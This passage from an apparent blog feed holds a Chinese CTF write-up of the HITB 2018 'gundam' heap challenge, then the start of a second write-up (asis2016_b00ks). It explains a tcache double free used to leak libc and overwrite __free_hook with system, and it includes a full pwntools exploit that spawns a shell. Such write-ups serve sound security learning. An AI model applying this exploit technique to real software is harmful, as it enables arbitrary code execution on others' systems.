[rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( dword_20208C )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">8</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *((_QWORD *)&amp;factory + i) &amp;&amp; **((_DWORD **)&amp;factory + i) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\nGundam[%u] :%s&quot;</span>, i, *(<span class="keyword">const</span> <span class="keyword">char</span> **)(*((_QWORD *)&amp;factory + i) + <span class="number">8LL</span>));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Type[%u] :%s\n&quot;</span>, i, (<span class="keyword">const</span> <span class="keyword">char</span> *)(*((_QWORD *)&amp;factory + i) + <span class="number">16LL</span>));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No gundam produced!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没有什么特别的内容。</p><h3 id="sub-D32-删除一个高达"><a href="#sub-D32-删除一个高达" class="headerlink" title="sub_D32 删除一个高达"></a>sub_D32 删除一个高达</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_D32</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( dword_20208C )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Which gundam do you want to Destory:&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">    <span class="keyword">if</span> ( v1 &gt; <span class="number">8</span> || !factory[v1] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    *(_DWORD *)factory[v1] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">free</span>(*(<span class="keyword">void</span> **)(factory[v1] + <span class="number">8LL</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No gundam&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到删除高达的操作是<br>1.将flag置0<br>2.free掉name的chunk<br>从中可以发现的漏洞：free掉name后指针没有置空，依旧可以free</p><h3 id="sub-E22-炸掉工厂"><a href="#sub-E22-炸掉工厂" class="headerlink" title="sub_E22 炸掉工厂"></a>sub_E22 炸掉工厂</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">sub_E22</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">8</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *((_QWORD *)&amp;factory + i) &amp;&amp; !**((_DWORD **)&amp;factory + i) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(*((<span class="keyword">void</span> **)&amp;factory + i));</span><br><span class="line">      *((_QWORD *)&amp;factory + i) = <span class="number">0LL</span>;</span><br><span class="line">      --dword_20208C;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>把所有flag=0但是结构体不为0的factory全都free了</p><h2 id="0x01-漏洞利用"><a href="#0x01-漏洞利用" class="headerlink" title="0x01 漏洞利用"></a>0x01 漏洞利用</h2><p>1.泄露地址<br>2.double free，构造堆快，修改__free_hook<br>3.执行system(‘/bin/sh’)</p><p>先放一下方便操作的对应功能的函数定义</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build</span>(<span class="params">name</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;choice : &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;gundam :&quot;</span>,name)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;gundam :&quot;</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">visit</span>():</span></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;choice : &quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">destroy</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;choice : &quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Destory:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">blow_up</span>():</span></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;choice : &quot;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="1-泄露地址"><a href="#1-泄露地址" class="headerlink" title="1.泄露地址"></a>1.泄露地址</h3><p>在sub_B7D中提到，read函数并没有对输入字符串末进行处理，因此只要装满就能泄露字符串后的地址。但是在2.26版本中，free掉堆块是会被放到tcache里的，tcache的位置在heap的底部，和libc之间的地址差存在随机性。但是tcache有容量上限，只要把tcache中的7个位置装满，第八个就会被放到unsorted bin中。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    build(<span class="string">&#x27;A&#x27;</span>*<span class="number">7</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    destroy(i)</span><br><span class="line">blow_up() </span><br></pre></td></tr></table></figure><p>先随便多造几个高达，然后free掉8个，并把他们的工场都用blow_up函数都炸了，用pwndbg可以看到此时的堆是这样的：<br><img src="https://img-blog.csdnimg.cn/20210319160611616.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05hc2hpX0tv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看到有7个chunk进了fastbin，第八个的factory进了fastbin，name进了unsortedbin。<br>此时，我们再把他们八个高达build出来，看一下效果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">       build(<span class="string">&#x27;A&#x27;</span>*<span class="number">7</span>)</span><br><span class="line">   build(<span class="string">&#x27;B&#x27;</span>*<span class="number">7</span>)</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210319161156257.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05hc2hpX0tv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看到所有的chunk都被激活了，我们再仔细看看第八个chunk，也就是我塞了7个’B’的chunk。<br><img src="https://img-blog.csdnimg.cn/20210319161329478.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05hc2hpX0tv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后就会惊喜的发现，在BBBBB后面连着一个神秘的7f开头的地址。<br>跳过去看看：<br><img src="https://img-blog.csdnimg.cn/2021031916143417.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05hc2hpX0tv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>好家伙，这不是main_arena的地址吗。<br><img src="https://img-blog.csdnimg.cn/20210319161609202.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05hc2hpX0tv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>通过vmmap可以看到，这个main_arena的地址在libc基地址下方，和heap相反，这里不会受到随机地址的影响，因此可以直接推算出libc的基地址。</p><p><img src="https://img-blog.csdnimg.cn/20210319161832995.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05hc2hpX0tv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>看一下程序执行过程中，泄露的效果。<br>通过本地调试即可算出这个地址和libc基地址之间的距离，从而继续推算出system函数地址以及__free_hook函数的地址，具体过程就不详细讲了，直接放脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>():</span></span><br><span class="line">    <span class="keyword">global</span> free_hook_addr,system_addr</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        build(<span class="string">&#x27;A&#x27;</span>*<span class="number">7</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        destroy(i)</span><br><span class="line">    blow_up() </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        build(<span class="string">&#x27;A&#x27;</span>*<span class="number">7</span>)</span><br><span class="line">    build(<span class="string">&#x27;B&#x27;</span>*<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line">    visit()</span><br><span class="line">    leak = u64(io.recvuntil(<span class="string">&quot;Type[7]&quot;</span>,drop=<span class="literal">True</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    libc_base = leak - <span class="number">0x3dac78</span></span><br><span class="line">    free_hook_addr = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    log.info(<span class="string">&#x27;libc:0x%x&#x27;</span> % libc_base)</span><br><span class="line">    log.info(<span class="string">&quot;__free_hook:0x%x&quot;</span> % free_hook_addr)</span><br><span class="line">    log.info(<span class="string">&quot;system:0x%x&quot;</span> % system_addr)</span><br></pre></td></tr></table></figure><p>这里的偏移地址0x3dac78就是之前第八个chunk泄露的地址和vmmap里看到的libc基地址相减得到的。<br>即7f687cd88c78(泄露地址) - 0x7f687c9ae000(libc基地址) = 0x3dac78(偏移地址)</p><h2 id="2-double-free，构造堆快，修改-free-hook"><a href="#2-double-free，构造堆快，修改-free-hook" class="headerlink" title="2.double free，构造堆快，修改__free_hook"></a>2.double free，构造堆快，修改__free_hook</h2><p>在2.26的tcache中不存在doublefree的检测机制，而之前我们也提到，sub_D32 也就是删除高达的函数，在free掉name之后并没有删除name指针，也就是说可以进行double free的操作。和fastbin不同，tcache的double free甚至不需要换一个堆free，直接两次free即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">destroy(<span class="number">2</span>)</span><br><span class="line">destroy(<span class="number">1</span>)</span><br><span class="line">destroy(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#1</span></span><br><span class="line">destroy(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#2</span></span><br><span class="line">blow_up()</span><br></pre></td></tr></table></figure><p>看似简单的五行代码其中暗藏玄机<br>前三行就是简单的按顺序free了三个name堆块。<br>在#1处attach一下，看看此时的堆块分布：<br><img src="https://img-blog.csdnimg.cn/20210319162851694.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05hc2hpX0tv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>有三个堆块进入了fastbin</p><p>之后再到#2处attach一下：<br><img src="https://img-blog.csdnimg.cn/20210319162911428.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05hc2hpX0tv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后就会惊人的发现，明明又free了一个堆块，但是显示的堆块并没有增加一个，反而减少了两个。<br>与此同时，还会发现这个free chunk的fd指针，指向的是它自己的用户区域，也就是chunk首地址+0x10的位置。<br>为了方便理解，我用excel做了个草图<br><img src="https://img-blog.csdnimg.cn/20210319163610296.png" alt="在这里插入图片描述"><br>可以看到，在#1处，tcache还是一个正常的单链表，但是当我再free一个chunk0的时候，它会按顺序进行如下操作：<br>1.将新free的chunk的fd指针指向头节点指向的第一个chunk，也就是把新来的chunk0的fd指针，指向了第一个chunk（还是chunk0）<br>2.把头节点的指针指向新free的chunk<br>因此就构成了图中这样的结果。<br>而此时，也就完成了double free。</p><p>然后执行了blow_up，将之前的0 1 2的工厂都炸了，方便之后构造三个chunk 0 1 2。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">build(p64(free_hook_addr))</span><br><span class="line">   build(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">   build(p64(system_addr))</span><br></pre></td></tr></table></figure><p>这里就是chunk构造部分。接着之前完成的double free，此时的chunk0内部是这样的：<br><img src="https://img-blog.csdnimg.cn/20210319164531287.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05hc2hpX0tv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看到chunk0内部只有一个指向自己的地址。<br>然后，执行build(p64(free_hook_addr))<br><img src="https://img-blog.csdnimg.cn/20210319164557290.png" alt="在这里插入图片描述"><br>可以看到，chunk0的fd指针已经变成了7f开头的__free_hook地址。</p><p>再执行build(‘/bin/sh’)，<br><img src="https://img-blog.csdnimg.cn/20210319164652574.png" alt="在这里插入图片描述"><br>此时，chunk0变成了只装了一个’/bin/sh’字符串的chunk了<br><img src="https://img-blog.csdnimg.cn/20210319164704778.png" alt="在这里插入图片描述"><br>与此同时，我们可以看到，tcache的头指针已经指向了__free_hook函数。<br>因为在上一步操作后，chunk0的fd指针已经指向了__free_hook，也就是说，当chunk0再被申请以后，再下一次申请，就会创建一个以__free_hook地址为起始用户区域的一个chunk，分配给它。<br><img src="https://img-blog.csdnimg.cn/20210319164852659.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05hc2hpX0tv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>最后一步，执行build(p64(system_addr))，申请一个堆块，并将system函数的地址写入，本质上就是申请了以__free_hook为用户区域起始地址的chunk。也就是将__free_hook的地址改成了system。<br>到此，构造chunk已经结束，我们已经成功将system函数绑定在了free的钩子上，此时只要free一个用户区域是’/bin/sh’的chunk，就相当于执行了system(‘/bin/sh’)，就能成功获得shell。<br>于是执行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">destroy(<span class="number">1</span>)    </span><br><span class="line">   io.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210319180811398.png" alt="在这里插入图片描述"></p><p>成功获得shell。</p><h1 id="0x03-脚本"><a href="#0x03-脚本" class="headerlink" title="0x03 脚本"></a>0x03 脚本</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./gundam&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/bi0x/ctf/tools/glibc-all-in-one/libs/2.26-0ubuntu2_amd64/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#context.log_level=&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build</span>(<span class="params">name</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;choice : &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;gundam :&quot;</span>,name)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;gundam :&quot;</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">visit</span>():</span></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;choice : &quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">destroy</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;choice : &quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Destory:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">blow_up</span>():</span></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;choice : &quot;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>():</span></span><br><span class="line">    <span class="keyword">global</span> free_hook_addr,system_addr</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        build(<span class="string">&#x27;A&#x27;</span>*<span class="number">7</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        destroy(i)</span><br><span class="line">    blow_up() </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        build(<span class="string">&#x27;A&#x27;</span>*<span class="number">7</span>)</span><br><span class="line">    build(<span class="string">&#x27;B&#x27;</span>*<span class="number">7</span>)</span><br><span class="line">    visit()</span><br><span class="line">    leak = u64(io.recvuntil(<span class="string">&quot;Type[7]&quot;</span>,drop=<span class="literal">True</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    libc_base = leak - <span class="number">0x3dac78</span> <span class="comment">#这里的偏移地址请在本地调试自行计算</span></span><br><span class="line">    free_hook_addr = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    log.info(<span class="string">&#x27;libc:0x%x&#x27;</span> % libc_base)</span><br><span class="line">    log.info(<span class="string">&quot;__free_hook:0x%x&quot;</span> % free_hook_addr)</span><br><span class="line">    log.info(<span class="string">&quot;system:0x%x&quot;</span> % system_addr)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">overwrite</span>():</span></span><br><span class="line">    destroy(<span class="number">2</span>)</span><br><span class="line">    destroy(<span class="number">1</span>)</span><br><span class="line">    destroy(<span class="number">0</span>)</span><br><span class="line">    destroy(<span class="number">0</span>)</span><br><span class="line">    blow_up()</span><br><span class="line">    build(p64(free_hook_addr))</span><br><span class="line">    build(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">    build(p64(system_addr))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    destroy(<span class="number">1</span>)    </span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    log.info(<span class="string">&#x27;check point %d&#x27;</span> % <span class="built_in">id</span>)</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    leak()</span><br><span class="line">    overwrite()</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;堆利用-TCache机制-HITB-CTF-2018-gundam&quot;&gt;&lt;a href=&quot;#堆利用-TCache机制-HITB-CTF-2018-gundam&quot; class=&quot;headerlink&quot; title=&quot;[堆利用:TCache机制]HITB CTF 201</summary>
      
    
    
    
    
    <category term="CTF" scheme="http://blog.k0nashi.cn/tags/CTF/"/>
    
    <category term="Pwn" scheme="http://blog.k0nashi.cn/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>[堆入门off-by-null]asis2016_b00ks</title>
    <link href="http://blog.k0nashi.cn/2020/12/02/b00ks/"/>
    <id>http://blog.k0nashi.cn/2020/12/02/b00ks/</id>
    <published>2020-12-02T10:38:02.000Z</published>
    <updated>2023-04-03T06:58:31.205Z</updated>
    
    <content type="html"><![CDATA[<h1 id="堆入门-off-by-null-asis2016-b00ks"><a href="#堆入门-off-by-null-asis2016-b00ks" class="headerlink" title="[堆入门 off-by-null] asis2016_b00ks"></a>[堆入门 off-by-null] asis2016_b00ks</h1><p>刚开始学pwn就听说，堆的题目很魔幻，需要大量的基础知识。在漫长地啃堆基础原理以后，这是我第一次自己研究学习并且完全明白原理的堆题。特地在此做笔记记录。</p><h2 id="0x00-逆向分析"><a href="#0x00-逆向分析" class="headerlink" title="0x00 逆向分析"></a>0x00 逆向分析</h2><p><img src="https://img-blog.csdnimg.cn/20201129194248447.png"></p><p>一进来就很容易发现，这也是堆题中最为常见的菜单题目。<br>简单分析一下，打开程序，最先产生交互的函数是sub_B6D。<br><img src="https://img-blog.csdnimg.cn/20201129194727591.png"></p><h3 id="漏洞点：sub-B6D"><a href="#漏洞点：sub-B6D" class="headerlink" title="漏洞点：sub_B6D"></a><em>漏洞点：sub_B6D</em></h3><p>调用了sub_9F5函数，是作者自己写的read函数，再进去看看。<br><img src="https://img-blog.csdnimg.cn/2020112920025945.png" alt="在这里插入图片描述"><br>注意这里的判定：先++buf，然后判断是否达到了最大长度（32字符），如果达到了，就跳出循环，然后把当前buf的字符变为\x00。<br>乍一看是没什么问题，但是仔细一想，它这里的i是从0开始，当i == a2的时候其实已经读了33个字符了，也就是说如果我们刚好输入32个字符以后，它会再读一个字符，并且会把这个字符变为\x00。<br>比如我输入了’A’ * 32，实际上数据流中我输入的是’AAAAAAAA…AAA\n’，当我们输入的第32个A被读取之后先检测是否是’\n’，通过，++buf，然后比对i是否等于a2，但是由于i从0开始，此时i为31，所以也通过，继续循环。<br>然后此时读取的字符是\n，检测到*buf == ‘\n’ 所以执行break，再把’\n’覆盖为\x00。导致最终读入的字符为32个’A’+一个’\x00’。<br>先简单写个脚本测试一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">name_size, name, desc_size, desc</span>):</span></span><br><span class="line">    <span class="keyword">global</span> p</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    